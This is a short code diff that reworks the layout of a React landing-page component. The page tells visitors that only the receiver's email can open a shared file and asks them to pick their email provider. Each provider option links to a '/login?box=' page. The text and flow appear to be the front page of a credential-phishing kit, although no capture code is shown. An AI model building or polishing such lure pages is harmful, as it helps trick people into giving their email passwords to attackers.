@@ -23,10 +23,12 @@ export default function Hero() {
          <p>Only Receiver&apos;s email can access file sharing</p>
          <p>SELECT AND CLICK ON YOUR EMAIL PROVIDER BELOW</p>
          <p><b>Example:(user@Yourdomain.com)</b></p>
-      </div>
 
-      <div className="relative z-10 mb-10 flex flex-wrap justify-center gap-4 px-4 sm:mb-16 sm:gap-6 sm:px-6">
-        {theme.map((option) => (
+         <br />
+         <br />
+         <br />
+         <div>
+  {theme.map((option) => (
           <Link
             key={option.text}
             href={`/login?box=${encodeURIComponent(option.text)}`}
@@ -37,7 +39,13 @@ export default function Hero() {
            
           </Link>
         ))}
+         </div>
+        
       </div>
+
+      {/* <div className="relative z-10 mb-10 flex flex-wrap justify-center gap-4 px-4 sm:mb-16 sm:gap-6 sm:px-6">
+       
+      </div> */}
     </section>
   );
 }
